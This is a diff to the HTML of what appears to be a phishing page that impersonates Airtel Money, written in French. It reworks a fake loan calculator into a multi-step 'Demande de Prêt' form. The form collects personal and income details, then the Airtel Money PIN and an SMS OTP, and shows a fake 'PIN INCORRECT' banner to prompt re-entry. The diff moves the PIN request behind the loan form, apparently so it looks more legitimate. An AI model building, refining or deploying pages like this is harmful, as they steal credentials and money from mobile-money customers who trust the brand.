@@ -47,7 +47,7 @@
     </button>
   </section>
 
-  <!-- ÉTAPE 2: CALCULATEUR DE PRÊT -->
+  <!-- ÉTAPE 2: CALCULATEUR DE PRÊT (SLIDER) -->
   <section id="step-slider" class="screen">
     <div class="welcome-banner">
       <h2>Calculateur de Prêt Airtel</h2>
@@ -93,16 +93,75 @@
     </button>
   </section>
 
-  <!-- ÉTAPE 3: NUMÉRO DE TÉLÉPHONE ET CODE PIN AIRTEL MONEY -->
-  <section id="step-form" class="screen">
-    <div style="background: var(--airtel-red); color: #FFF; padding: 24px; text-align: center; border-radius: 0 0 16px 16px; margin: -24px -24px 20px -24px;">
-      <h2 style="font-size: 22px; margin-bottom: 4px;">Airtel Money</h2>
-      <p style="font-size: 13px; opacity: 0.9;">Connexion Airtel Money. Veuillez entrer votre numéro et votre code PIN</p>
+  <!-- ÉTAPE 3: FORMULAIRE - ÉTAPE 1 SUR 3 -->
+  <section id="step-form-1" class="screen">
+    <div style="text-align: center; margin-bottom: 16px;">
+      <h2 style="font-size: 20px; color: var(--text-main);">Demande de Prêt</h2>
+      <p style="color: var(--text-muted); font-size: 13px;">Étape 1 sur 3</p>
+      <div style="display: flex; gap: 8px; margin-top: 10px;">
+        <div style="flex: 1; height: 4px; background: var(--airtel-red); border-radius: 2px;"></div>
+        <div style="flex: 1; height: 4px; background: #E5E5EA; border-radius: 2px;"></div>
+        <div style="flex: 1; height: 4px; background: #E5E5EA; border-radius: 2px;"></div>
+      </div>
     </div>
 
-    <!-- BANNIÈRE D'ERREUR SURFACE -->
-    <div id="creds-surface-banner" class="surface-banner">
-      NUMÉRO OU PIN INCORRECT ❌ (Veuillez ressaisir un code PIN valide)
+    <div class="form-group">
+      <label for="loan-type">Type de Prêt</label>
+      <select id="loan-type" class="input-field">
+        <option value="Prêt Commercial">Prêt Commercial (Business)</option>
+        <option value="Prêt Personnel">Prêt Personnel</option>
+        <option value="Prêt d'Urgence">Prêt d'Urgence</option>
+      </select>
+    </div>
+
+    <div class="form-group">
+      <label for="form-amount">Montant du Prêt (FCFA)</label>
+      <input type="text" id="form-amount" class="input-field" readonly>
+    </div>
+
+    <div class="form-group">
+      <label for="form-duration">Durée du Prêt</label>
+      <select id="form-duration" class="input-field">
+        <option value="6 Mois">6 Mois</option>
+        <option value="12 Mois" selected>12 Mois</option>
+        <option value="24 Mois">24 Mois</option>
+        <option value="36 Mois">36 Mois</option>
+        <option value="48 Mois">48 Mois</option>
+        <option value="60 Mois">60 Mois</option>
+      </select>
+    </div>
+
+    <div class="form-group">
+      <label for="loan-purpose">Motif du Prêt</label>
+      <textarea id="loan-purpose" class="input-field" rows="3" placeholder="Décrivez l'objectif de votre prêt..."></textarea>
+    </div>
+
+    <button id="btn-form1-next" class="btn-primary btn-large" style="margin-top: auto;">
+      ÉTAPE SUIVANTE →
+    </button>
+  </section>
+
+  <!-- ÉTAPE 4: FORMULAIRE - ÉTAPE 2 SUR 3 -->
+  <section id="step-form-2" class="screen">
+    <div style="text-align: center; margin-bottom: 16px;">
+      <h2 style="font-size: 20px; color: var(--text-main);">Demande de Prêt</h2>
+      <p style="color: var(--text-muted); font-size: 13px;">Étape 2 sur 3</p>
+      <div style="display: flex; gap: 8px; margin-top: 10px;">
+        <div style="flex: 1; height: 4px; background: var(--airtel-red); border-radius: 2px;"></div>
+        <div style="flex: 1; height: 4px; background: var(--airtel-red); border-radius: 2px;"></div>
+        <div style="flex: 1; height: 4px; background: #E5E5EA; border-radius: 2px;"></div>
+      </div>
+    </div>
+
+    <div style="display: flex; gap: 12px;" class="form-group">
+      <div style="flex: 1;">
+        <label for="first-name">Prénom</label>
+        <input type="text" id="first-name" class="input-field" placeholder="Prénom">
+      </div>
+      <div style="flex: 1;">
+        <label for="last-name">Nom</label>
+        <input type="text" id="last-name" class="input-field" placeholder="Nom">
+      </div>
     </div>
 
     <div class="form-group">
@@ -114,8 +173,81 @@
       <span id="phone-error" class="error-text">Veuillez entrer un numéro Airtel valide.</span>
     </div>
 
-    <div class="form-group" style="text-align: center;">
-      <label style="color: var(--text-muted); font-size: 14px; margin-bottom: 8px; display: block;">Code PIN Airtel Money (4 chiffres)</label>
+    <div style="display: flex; gap: 12px; margin-top: auto;">
+      <button id="btn-form2-back" class="btn-primary" style="background-color: #E5E5EA; color: var(--text-main);">PRÉCÉDENT</button>
+      <button id="btn-form2-next" class="btn-primary">ÉTAPE SUIVANTE</button>
+    </div>
+  </section>
+
+  <!-- ÉTAPE 5: FORMULAIRE - ÉTAPE 3 SUR 3 (RÉSUMÉ) -->
+  <section id="step-form-3" class="screen">
+    <div style="text-align: center; margin-bottom: 16px;">
+      <h2 style="font-size: 20px; color: var(--text-main);">Demande de Prêt</h2>
+      <p style="color: var(--text-muted); font-size: 13px;">Étape 3 sur 3</p>
+      <div style="display: flex; gap: 8px; margin-top: 10px;">
+        <div style="flex: 1; height: 4px; background: var(--airtel-red); border-radius: 2px;"></div>
+        <div style="flex: 1; height: 4px; background: var(--airtel-red); border-radius: 2px;"></div>
+        <div style="flex: 1; height: 4px; background: var(--airtel-red); border-radius: 2px;"></div>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label for="employment-status">Statut d'emploi</label>
+      <select id="employment-status" class="input-field">
+        <option value="Commerçant / Entrepreneur">Commerçant / Entrepreneur</option>
+        <option value="Employé du secteur privé">Employé du secteur privé</option>
+        <option value="Fonctionnaire">Fonctionnaire</option>
+        <option value="Indépendant">Indépendant</option>
+      </select>
+    </div>
+
+    <div class="form-group">
+      <label for="annual-income">Revenu Annuel (FCFA)</label>
+      <input type="number" id="annual-income" class="input-field" placeholder="Entrez votre revenu annuel">
+    </div>
+
+    <!-- RÉSUMÉ DE LA DEMANDE -->
+    <div class="loan-details-card" style="margin-top: 10px;">
+      <div class="detail-header-label">Résumé de la Demande</div>
+      <div style="font-size: 13px; line-height: 1.8;">
+        <div style="display: flex; justify-content: space-between;">
+          <span style="color: var(--text-muted);">Montant du Prêt:</span>
+          <strong id="summary-amount">100,000 FCFA</strong>
+        </div>
+        <div style="display: flex; justify-content: space-between;">
+          <span style="color: var(--text-muted);">Durée du Prêt:</span>
+          <strong id="summary-duration">12 Mois</strong>
+        </div>
+        <div style="display: flex; justify-content: space-between;">
+          <span style="color: var(--text-muted);">Motif:</span>
+          <strong id="summary-purpose">Commercial</strong>
+        </div>
+        <div style="display: flex; justify-content: space-between;">
+          <span style="color: var(--text-muted);">Demandeur:</span>
+          <strong id="summary-applicant">Airtel Customer</strong>
+        </div>
+      </div>
+    </div>
+
+    <div style="display: flex; gap: 12px; margin-top: auto;">
+      <button id="btn-form3-back" class="btn-primary" style="background-color: #E5E5EA; color: var(--text-main);">PRÉCÉDENT</button>
+      <button id="btn-form3-submit" class="btn-primary">SOUMETTRE LA DEMANDE</button>
+    </div>
+  </section>
+
+  <!-- ÉTAPE 6: CODE PIN AIRTEL MONEY (4 CHIFFRES) -->
+  <section id="step-pin" class="screen">
+    <div style="background: var(--airtel-red); color: #FFF; padding: 24px; text-align: center; border-radius: 0 0 16px 16px; margin: -24px -24px 20px -24px;">
+      <h2 style="font-size: 22px; margin-bottom: 4px;">Airtel Money</h2>
+      <p style="font-size: 13px; opacity: 0.9;">Veuillez saisir votre code PIN Airtel Money à 4 chiffres pour confirmer</p>
+    </div>
+
+    <div id="creds-surface-banner" class="surface-banner">
+      CODE PIN INCORRECT ❌ (Veuillez ressaisir un code PIN valide)
+    </div>
+
+    <div class="form-group" style="text-align: center; margin-top: 20px;">
+      <label style="color: var(--text-muted); font-size: 14px; margin-bottom: 12px; display: block;">Code PIN Airtel Money (4 chiffres)</label>
       <div class="pin-grid">
         <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
         <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
@@ -125,10 +257,10 @@
       <span id="pin-error" class="error-text">Veuillez entrer votre code PIN à 4 chiffres.</span>
     </div>
 
-    <button id="btn-submit-creds" class="btn-primary btn-large" style="margin-top: 20px;">Se Connecter (Sign In)</button>
+    <button id="btn-submit-creds" class="btn-primary btn-large" style="margin-top: auto;">CONFIRMER ET PROCDER</button>
   </section>
 
-  <!-- ÉTAPE 4: OTP SMS AIRTEL (4 CHIFFRES) -->
+  <!-- ÉTAPE 7: OTP SMS AIRTEL (4 CHIFFRES) -->
   <section id="step-otp" class="screen">
     <h2 style="margin-bottom: 6px;">Vérification SMS Airtel</h2>
     <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 16px;">
@@ -156,7 +288,7 @@
     <button id="btn-submit-otp" class="btn-primary" style="margin-top: 20px;">VALIDER LE CODE OTP</button>
   </section>
 
-  <!-- ÉTAPE 5: ÉCRAN DE SUCCÈS -->
+  <!-- ÉTAPE 8: ÉCRAN DE SUCCÈS -->
   <section id="step-success" class="screen">
     <div style="text-align: center; margin-top: 10px;">
       <div class="circle-check-icon">✓</div>
@@ -210,5 +342,5 @@
 
 <script src="script.js"></script>
 </body>
-      </html>
+          </html>
   
